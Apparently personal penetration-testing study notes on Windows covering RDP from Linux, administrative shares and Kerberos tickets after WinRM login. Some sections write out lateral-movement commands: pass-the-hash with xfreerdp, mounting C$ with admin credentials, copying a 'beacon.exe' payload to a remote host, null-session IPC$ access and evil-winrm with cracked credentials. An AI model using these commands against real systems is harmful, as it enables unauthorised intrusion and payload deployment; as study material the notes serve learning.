The system  environment variable for the Windows directory is `%windir%` 

---
---
## RDP from Linux

When you log in using RDP the current user logs out.

## 1. xfreerdp (best for offensive work)

```bash
# Basic connection
xfreerdp /v:192.168.1.10 /u:Administrator /p:Password123

# With domain
xfreerdp /v:192.168.1.10 /u:jsmith /p:Pass123 /d:CORP

# Pass the Hash (no plaintext needed)
xfreerdp /v:192.168.1.10 /u:Administrator /pth:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c

# Ignore cert warning
xfreerdp /v:192.168.1.10 /u:Administrator /p:Pass123 /cert:ignore

# Full screen, clipboard sharing
xfreerdp /v:192.168.1.10 /u:Administrator /p:Pass123 /f /clipboard
```

---
---
**Note** : UAC (by default) doesn't apply for the built-in local administrator account.

---
---
If you open the Task Manager for the attached VM, you will notice that it doesn't display a Startup tab. You will also not see anything in the Startup tab inside the `msconfig` utility, as shown above. This is because the attached machine is a Windows server, and Windows servers handle startup applications differently than Windows client systems. Unlike Windows 10 or 11, you will not see startup programs in `Task Manager` or in the Startup tab of `msconfig`. On these Windows server machines, the only reliable way to view user-level startup items is through the Startup folder itself. You can access it by pressing `**Win + R**`, which opens the Run Dialog, typing **`shell:startup`**, and then pressing Enter. This will display all startup programs as shortcuts or executables that are configured to run automatically the next time a user logs in.

---
---
## Windows Shares — `$` vs No `$`

## `$` Sign = Hidden Share

The `$` at the end simply **hides the share from browsing** — it won't show up when someone does `net view \\hostname`, but it's fully accessible if you know the name.

```cmd
net view \\192.168.1.10          # won't show $ shares
net view \\192.168.1.10 /all     # shows everything including $ shares
```

## Built-in Administrative Shares

Windows automatically creates these:

|Share|Points To|Purpose|
|---|---|---|
|`C$`|`C:\`|Full drive access|
|`ADMIN$`|`C:\Windows`|Remote admin/psexec|
|`IPC$`|N/A|Inter-process communication, named pipes|
|`D$`|`D:\`|Every drive gets one|

These are created automatically and require **local admin** to access.

## Regular Shares (no `$`)

```cmd
\\server\Finance        # visible to everyone browsing
\\server\IT             # visible
```

Anyone on the network can **see these exist** via `net view`, access depends on permissions.

## Offensive Relevance

```cmd
# C$ is gold — full filesystem access with admin creds
net use \\192.168.1.10\C$ /user:Administrator Password123

# Copy payload via C$
copy beacon.exe \\192.168.1.10\C$\Windows\Temp\

# IPC$ is used for authenticated null sessions / enumeration
net use \\192.168.1.10\IPC$ "" /user:""
```

**`ADMIN$` is what psexec uses** internally to drop its service binary into `C:\Windows\` before executing it remotely.

---
---
# Can't we just login via winrm and then request TGS ? because we logged in ?

Yes exactly — that is a completely valid path and honestly more common in practice:

```
Crack svc_mssql : Summer2024!
→ evil-winrm -i DC_IP -u svc_mssql -p Summer2024!
→ now you have a shell on the machine
→ you ARE logged in as svc_mssql
→ Windows automatically got you a TGT in the background
→ you can now request TGS for anything from that session
```

When you log in via WinRM, RDP, psexec — Windows handles the entire Kerberos flow automatically. TGT is requested silently in the background the moment you authenticate. You never have to manually request it.

---
### So Why Did We Even Mention Requesting TGT Manually

Manual TGT requests come up in specific scenarios:

```
You have creds but no remote access open (WinRM/RDP/SMB blocked)
→ request TGT manually via Rubeus or impacket
→ use that TGT for other Kerberos attacks like Pass the Ticket

Or you are doing everything from your Linux attack box
→ no Windows session available
→ impacket tools handle TGT requesting manually under the hood
```

---
---
